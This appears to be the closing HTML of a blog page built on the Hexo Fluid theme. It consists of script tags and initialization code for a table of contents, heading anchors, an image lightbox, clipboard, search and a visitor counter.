  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/xm_custom/custom.js"></script>



<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
